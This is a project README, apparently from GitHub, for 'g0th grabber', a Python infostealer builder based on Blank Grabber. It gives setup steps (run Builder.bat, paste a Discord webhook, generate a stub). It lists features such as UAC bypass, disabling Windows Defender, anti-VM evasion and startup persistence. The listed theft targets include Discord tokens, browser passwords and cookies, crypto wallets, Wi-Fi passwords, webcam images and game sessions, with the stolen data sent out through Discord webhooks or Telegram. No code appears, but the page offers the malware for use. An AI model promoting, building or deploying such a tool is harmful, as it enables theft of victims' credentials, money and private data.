<h3 align="center">g0th grabber</h3>

<p align="left"> <img src="https://komarev.com/ghpvc/?username=xen-light&label=Profile%20views&color=0e75b6&style=flat" alt="xen-light" /> </p>

<p align="left"> <a href="https://twitter.com/xeniight" target="blank"><img src="https://img.shields.io/twitter/follow/xeniight?logo=twitter&style=for-the-badge" alt="xeniight" /></a> </p>

## Brief Overview
- A simple Python grabber.

## NOTICE!
- This project is based on Blank-c's Blank Grabber, but as of August 2023 it was discontinued, as well as the forked version.
- Credits to Blank-c and contributors. I used the project as a template and improved it.

# INSTRUCTIONS
- you need python 3.10+ - i used [python 3.11.6](https://www.python.org/ftp/python/3.11.6/python-3.11.6-amd64.exe)

- run Builder.bat or it won't work.
- when the gui appears, select your desired options, put your webhook click on generate, give it some time and your stub will appear.

# features
```
• GUI Builder.
• UAC Bypass.
• Custom Icon.
• Runs On Startup.
• Disables Windows Defender.
• Anti-VM.
• Blocks AV-Related Sites.
• Melt Stub.
• Fake Error.
• EXE Binder.
• File Pumper.
• Obfuscated Code.
• Discord Injection.
• Steals Discord Tokens.
• Steals Steam Session.
• Steals Epic Session.
• Steals Uplay Session.
• Steals Battle.Net Session.
• Steals Passwords From Many Browsers.
• Steals Cookies From Many Browsers.
• Steals History From Many Browsers.
• Steals Autofills From Many Browsers.
• Steals Minecraft Session Files.
• Steals Telegram Session Files.
• Steals Crypto Wallets.
• Steals Roblox Cookies.
• Steals Growtopia Session.
• Steals IP Information.
• Steals System Info.
• Steals Saved Wifi Passwords.
• Steals Common Files.
• Captures Screenshot.
• Captures Webcam Image.
• Sends All Data Through Discord Webhooks/Telegram Bot.
(...more)
```

- personal website: [https://xenlight.xyz](https://xenlight.xyz)

<h3 align="left">Connect with me:</h3>
<p align="left">
<a href="https://twitter.com/xeniight" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/twitter.svg" alt="xeniight" height="30" width="40" /></a>
<a href="https://instagram.com/xeniight" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/instagram.svg" alt="xeniight" height="30" width="40" /></a>
<a href="https://youtube.com/@xenIight" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/youtube.svg" alt="xeniight" height="30" width="40" /></a>
</p>

<h3 align="left">Languages and Tools:</h3>
<p align="left"> <a href="https://aws.amazon.com" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/amazonwebservices/amazonwebservices-original-wordmark.svg" alt="aws" width="40" height="40"/> </a> <a href="https://git-scm.com/" target="_blank" rel="noreferrer"> <img src="https://www.vectorlogo.zone/logos/git-scm/git-scm-icon.svg" alt="git" width="40" height="40"/> </a> <a href="https://www.w3.org/html/" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/html5/html5-original-wordmark.svg" alt="html5" width="40" height="40"/> </a> <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/javascript/javascript-original.svg" alt="javascript" width="40" height="40"/> </a> <a href="https://www.mongodb.com/" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/mongodb/mongodb-original-wordmark.svg" alt="mongodb" width="40" height="40"/> </a> <a href="https://nodejs.org" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/nodejs/nodejs-original-wordmark.svg" alt="nodejs" width="40" height="40"/> </a> <a href="https://www.python.org" target="_blank" rel="noreferrer"> <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" alt="python" width="40" height="40"/> </a> <a href="https://zapier.com" target="_blank" rel="noreferrer"> <img src="https://www.vectorlogo.zone/logos/zapier/zapier-icon.svg" alt="zapier" width="40" height="40"/> </a> </p>
